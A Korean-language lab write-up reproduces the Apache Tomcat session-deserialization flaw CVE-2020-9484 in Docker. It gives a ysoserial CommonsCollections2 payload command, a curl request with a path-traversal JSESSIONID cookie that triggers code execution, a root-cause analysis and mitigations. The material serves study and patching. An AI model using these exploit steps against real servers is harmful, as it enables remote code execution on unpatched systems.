# CVE-2020-9484 



## 0. 취약한 환경 버전

#### Apache Tomcat

> 7.0.0 ~ 7.0.103
>
> 8.5.0 ~ 8.5.54
>
> 9.0.0.M1 ~ 9.0.34
>
> 10.0.0-M1 ~ 10.0.0-M4

<br>

## 1. 환경 구성

> **ubuntu 20.04**
>
> **docker**
>
> **ysoserial**

<br>

> CommonsCollections2 가젯 체인을 이용하여 공격 코드가 포함된 세션 파일 생성 ( docker 파일 내 첨부되어 따로 실행하지 않아도 됨)

``````
java -jar ./ysoserial-master.jar CommonsCollections2 'tocuh /tmp/rce' > groovy.session
``````

<br>

ysoserial: https://github.com/frohoff/ysoserial

<br>

> docker 파일이 존재하는 git 서버 클론

```
git clone https://github.com/masahiro331/CVE-2020-9484.git
```
<br>

![1](https://user-images.githubusercontent.com/89399749/142800342-9f65e411-9825-401d-ac83-56318231ff51.png)



<br>



> 톰캣 서버 이미지 생성

```docker build -t tomcat:groovy .
docker build -t tomcat:groovy .
```
<br>

![2](https://user-images.githubusercontent.com/89399749/142800388-e3185355-e0eb-4ce7-9c74-8254eb35a953.png)


<br>


>호스트 8080번 포트를 도커의 8080포트로 전달하여 실행

```docker run -d -p 8080:8080 tomcat:groovy
docker run -d -p 8080:8080 tomcat:groovy
```

<br>

![3](https://user-images.githubusercontent.com/89399749/142800402-544253c4-a8ec-443c-bb0c-7ffee4e0ec12.png)


<br>


> 도커 프로세스 확인

```
docker ps -a
```
<br>

![4](https://user-images.githubusercontent.com/89399749/142800426-7f9b048e-ebfe-42ca-a215-cf2b93834402.png)


<br>

> 도커 진입

```docker exec -t -i 이름 /bin/bash
docker exec -t -i 이름 /bin/bash
```
<br>

![5](https://user-images.githubusercontent.com/89399749/142800451-014b029d-190f-4396-bffe-c2e893ba341a.png)


<br>

## 2. PoC



> 아파치 서버 웹페이지 확인

<br>

![7](https://user-images.githubusercontent.com/89399749/142800468-a7095174-4e8e-4383-963c-c915b8d61d9f.png)


<br>



> tmp 폴더 확인

```cd /tmp & ls
cd /tmp & ls
```

<br>

![6](https://user-images.githubusercontent.com/89399749/142800480-dc71568b-ab33-4f59-b823-884c24da5245.png)


<br>





> 취약한 Session Deserialization을 이용하여 rce 파일 삽입

```
curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy
```

<br>

![8](https://user-images.githubusercontent.com/89399749/142800500-aab3a583-37a9-4f53-9e1b-49f2fb55075b.png)


<br>





## 3. 원인 분석

Tomcat에서 사용하는 Session Manager는 Standard Manager와 Persistent Manager 2가지가 있다. Standard Manager는 Tomcat 기본 설정으로 메모리에 세션을 저장하다가 서버의 재시작/정지 시에 세션 데이터를 직렬화하여 session.ser 파일에 저장한다. 서버 에러 등 예기치 않은 정지 시에는 세션 데이터가 저장되지 않는다. 



Persistent Manager는 Standard와 동일하나 일정 시간 사용되지 않는 세션을 가져와 파일 또는 데이터베이스에 저장한다. 세션을 저장할 때는 세션 데이터를 직렬화하여 저장하고, 해당 세션 요청이 들어오면 역직렬화하여 메모리에 가져온다.



Persistent Manager를 사용하여 세션을 관리할 때에는 세션을 저장할 디렉터리를 정할 수 있다. Store 요소 안에 className 속성을 org.apache.catalina.FileStore로 지정하면 directory 속성으로 저장할 디렉터리를 지정할 수 있으며, 세션ID를 사용해 파일 이름을 저장한다. className 속성을 org.apache.caltalina.JDBCStore로 지정하면 개별 행으로 저장되는 데이터베이스에 세션이 저장된다



```xml
<Manager className="org.apache.catalina.session.PersistentManager" sessionAttributeValueClassNameFilter="">

<Store className="org.apache.catalina.session.FileStore" directory="/tomcat/sessions/"/>

</Manager>
```





**RCE 실행 조건**

1. 공격자는 서버에 있는 파일 내용과 이름을 제어할 수 있는 경우
2. 서버가 PersistenceManager의 FileStore를 사용하도록 구성된 경우
3. PersistenceManager가 sessionAttributeValueClassNameFilter="null" 또는 공격자가 제공한 개체를 역직렬화할 수 있도록 필터 구성이 미흡한 경우
4. 공격자는 FileStore에서 사용하는 스토리지 위치와 제어가능한 파일의 상대 경로를 아는 경우





## 4. 대응 방안

1. Persistent Manger 주석처리
2. FileStore 기능을 비활성화하거나 sessionAttributeValueClassNameFilte 값을 별도로 구성하여 특정 속성을 가진 개체만 직렬화/역직렬화할 수 있도록 조치
3. 버전 업그레이드





## 참조

1. https://github.com/masahiro331/CVE-2020-9484

2. https://github.com/frohoff/ysoserial
3. https://m.blog.naver.com/skinfosec2000/222042818637

